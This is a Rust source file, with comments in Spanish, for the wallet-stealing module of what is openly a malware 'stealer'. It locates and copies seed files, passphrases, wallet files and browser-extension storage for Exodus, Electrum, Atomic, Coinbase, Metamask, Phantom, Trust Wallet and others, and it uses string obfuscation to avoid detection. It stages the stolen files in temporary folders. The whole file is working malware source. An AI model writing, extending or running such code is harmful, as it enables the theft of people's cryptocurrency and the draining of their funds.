// Stealer de wallets de criptomonedas
use crate::stealer::common::{get_appdata_local, get_appdata_roaming};
use std::path::PathBuf;
use std::fs;
use obfstr::obfstr; // ← Ofuscación de strings

/// Información de una wallet robada
#[derive(Debug, Clone)]
pub struct WalletData {
    pub wallet_name: String,
    pub path: PathBuf,
    pub files: Vec<String>,  // Archivos robados
}

impl WalletData {
    pub fn to_string(&self) -> String {
        let mut output = format!("[{}]\n", self.wallet_name);
        output.push_str(&format!("Path: {}\n", self.path.display()));
        output.push_str(&format!("Files: {}\n", self.files.join(", ")));
        output
    }
}

/// Información de wallets soportadas
struct WalletInfo {
    name: String,
    path_local: Option<String>,    // Ruta desde %LOCALAPPDATA%
    path_roaming: Option<String>,  // Ruta desde %APPDATA%
    files_to_steal: Vec<String>,   // Archivos/carpetas a robar
}

// Función que retorna las wallets ofuscadas (no puede ser const porque obfstr!() evalúa en runtime)
fn get_wallets() -> Vec<WalletInfo> {
    vec![
        // Metamask (browser extension wallets son manejados separadamente) - OFUSCADO
        WalletInfo {
            name: obfstr!("Exodus").to_string(),
            path_local: None,
            path_roaming: Some(obfstr!(r"Exodus").to_string()),
            files_to_steal: vec![
                obfstr!("exodus.wallet").to_string(), 
                obfstr!("seed.seco").to_string(), 
                obfstr!("info.seco").to_string(), 
                obfstr!("passphrase.json").to_string()
            ],
        },
        WalletInfo {
            name: obfstr!("Atomic").to_string(),
            path_local: None,
            path_roaming: Some(obfstr!(r"atomic\Local Storage\leveldb").to_string()),
            files_to_steal: vec![
                obfstr!("CURRENT").to_string(), 
                obfstr!("LOCK").to_string(), 
                obfstr!("LOG").to_string(), 
                obfstr!("MANIFEST-*").to_string(), 
                obfstr!("*.log").to_string(), 
                obfstr!("*.ldb").to_string()
            ],
        },
        WalletInfo {
            name: obfstr!("Coinbase").to_string(),
            path_local: Some(obfstr!(r"Coinbase Wallet\User Data\Default").to_string()),
            path_roaming: None,
            files_to_steal: vec![
                obfstr!("Local Storage").to_string(), 
                obfstr!("IndexedDB").to_string()
            ],
        },
        WalletInfo {
            name: obfstr!("Electrum").to_string(),
            path_local: None,
            path_roaming: Some(obfstr!(r"Electrum\wallets").to_string()),
            files_to_steal: vec![
                obfstr!("default_wallet").to_string(), 
                obfstr!("wallet_*").to_string()
            ],
        },
        WalletInfo {
            name: obfstr!("Guarda").to_string(),
            path_local: None,
            path_roaming: Some(obfstr!(r"Guarda\Local Storage\leveldb").to_string()),
            files_to_steal: vec![
                obfstr!("*.ldb").to_string(), 
                obfstr!("*.log").to_string()
            ],
        },
        WalletInfo {
            name: obfstr!("Ronin").to_string(),
            path_local: Some(obfstr!(r"Ronin Wallet\User Data\Default").to_string()),
            path_roaming: None,
            files_to_steal: vec![
                obfstr!("Local Storage").to_string(), 
                obfstr!("IndexedDB").to_string()
            ],
        },
    ]
}

/// Roba datos de todas las wallets instaladas
pub fn steal_wallets() -> Vec<WalletData> {
    let mut stolen_wallets = Vec::new();
    
    let wallets = get_wallets();  // Obtener wallets ofuscadas
    for wallet_info in &wallets {
        if let Some(wallet_data) = steal_single_wallet(wallet_info) {
            stolen_wallets.push(wallet_data);
        }
    }
    
    // Agregar Metamask desde browser extensions
    stolen_wallets.extend(steal_browser_extension_wallets());
    
    stolen_wallets
}

/// Roba datos de una wallet específica
fn steal_single_wallet(wallet_info: &WalletInfo) -> Option<WalletData> {
    let wallet_path = if let Some(ref local_path) = wallet_info.path_local {
        get_appdata_local()?.join(local_path)
    } else if let Some(ref roaming_path) = wallet_info.path_roaming {
        get_appdata_roaming()?.join(roaming_path)
    } else {
        return None;
    };
    
    if !wallet_path.exists() {
        return None;
    }
    
    let mut stolen_files = Vec::new();
    
    // Copiar archivos especificados
    for file_pattern in &wallet_info.files_to_steal {
        if file_pattern.contains('*') {
            // Pattern matching (*.ldb, wallet_*, etc.)
            if let Ok(entries) = fs::read_dir(&wallet_path) {
                for entry in entries.flatten() {
                    let file_name = entry.file_name().to_string_lossy().to_string();
                    
                    if matches_pattern(&file_name, file_pattern) {
                        stolen_files.push(file_name);
                    }
                }
            }
        } else {
            // Archivo/carpeta específica
            let file_path = wallet_path.join(file_pattern);
            
            if file_path.exists() {
                stolen_files.push(file_pattern.to_string());
            }
        }
    }
    
    if stolen_files.is_empty() {
        return None;
    }
    
    Some(WalletData {
        wallet_name: wallet_info.name.clone(),
        path: wallet_path,
        files: stolen_files,
    })
}

/// Roba wallets de extensiones de browsers (Metamask, Phantom, etc.)
fn steal_browser_extension_wallets() -> Vec<WalletData> {
    let mut wallets = Vec::new();
    
    let local_appdata = match get_appdata_local() {
        Some(path) => path,
        None => return wallets,
    };
    
    // Metamask para Chrome/Brave/Edge
    let browser_paths = vec![
        (r"Google\Chrome\User Data\Default\Local Extension Settings", "Chrome"),
        (r"Microsoft\Edge\User Data\Default\Local Extension Settings", "Edge"),
        (r"BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings", "Brave"),
    ];
    
    for (browser_path, browser_name) in browser_paths {
        let extensions_path = local_appdata.join(browser_path);
        
        if !extensions_path.exists() {
            continue;
        }
        
        // IDs de extensiones de wallets conocidas - OFUSCADAS
        let wallet_extensions = vec![
            (obfstr!("nkbihfbeogaeaoehlefnkodbefgpgknn").to_string(), obfstr!("Metamask").to_string()),       // Metamask
            (obfstr!("bfnaelmomeimhlpmgjnjophhpkkoljpa").to_string(), obfstr!("Phantom").to_string()),        // Phantom
            (obfstr!("fhbohimaelbohpjbbldcngcnapndodjp").to_string(), obfstr!("Binance Chain").to_string()),  // Binance Chain Wallet
            (obfstr!("hnfanknocfeofbddgcijnmhnfnkdnaad").to_string(), obfstr!("Coinbase Wallet").to_string()), // Coinbase
            (obfstr!("afbcbjpbpfadlkmhmclhkeeodmamcflc").to_string(), obfstr!("Math Wallet").to_string()),    // Math Wallet
            (obfstr!("egjidjbpglichdcondbcbdnbeeppgdph").to_string(), obfstr!("Trust Wallet").to_string()),   // Trust Wallet
        ];
        
        for (extension_id, wallet_name) in &wallet_extensions {
            let extension_path = extensions_path.join(extension_id);
            
            if extension_path.exists() {
                if let Ok(entries) = fs::read_dir(&extension_path) {
                    let files: Vec<String> = entries
                        .flatten()
                        .map(|e| e.file_name().to_string_lossy().to_string())
                        .collect();
                    
                    if !files.is_empty() {
                        wallets.push(WalletData {
                            wallet_name: format!("{} ({})", wallet_name, browser_name),
                            path: extension_path,
                            files,
                        });
                    }
                }
            }
        }
    }
    
    wallets
}

/// Verifica si un nombre coincide con un patrón simple (* wildcard)
fn matches_pattern(name: &str, pattern: &str) -> bool {
    if !pattern.contains('*') {
        return name == pattern;
    }
    
    let parts: Vec<&str> = pattern.split('*').collect();
    
    if parts.len() == 2 {
        // Patrón tipo "*.ext" o "prefix*"
        let prefix = parts[0];
        let suffix = parts[1];
        
        name.starts_with(prefix) && name.ends_with(suffix)
    } else {
        false
    }
}

/// Exporta los archivos de wallets copiándolos a un directorio temporal
pub fn export_wallet_files(wallet: &WalletData) -> Option<PathBuf> {
    let temp_dir = std::env::temp_dir();
    let export_dir = temp_dir.join(format!("wallet_{}", wallet.wallet_name.replace(" ", "_")));
    
    // Crear directorio de exportación
    if let Err(_) = fs::create_dir_all(&export_dir) {
        return None;
    }
    
    // Copiar archivos
    for file_name in &wallet.files {
        let src = wallet.path.join(file_name);
        let dst = export_dir.join(file_name);
        
        // Crear subdirectorios si es necesario
        if let Some(parent) = dst.parent() {
            let _ = fs::create_dir_all(parent);
        }
        
        // Copiar archivo o directorio
        if src.is_file() {
            let _ = fs::copy(&src, &dst);
        } else if src.is_dir() {
            let _ = copy_dir_recursive(&src, &dst);
        }
    }
    
    Some(export_dir)
}

/// Copia un directorio recursivamente
fn copy_dir_recursive(src: &PathBuf, dst: &PathBuf) -> std::io::Result<()> {
    fs::create_dir_all(dst)?;
    
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let file_type = entry.file_type()?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());
        
        if file_type.is_dir() {
            copy_dir_recursive(&src_path, &dst_path)?;
        } else {
            fs::copy(&src_path, &dst_path)?;
        }
    }
    
    Ok(())
}
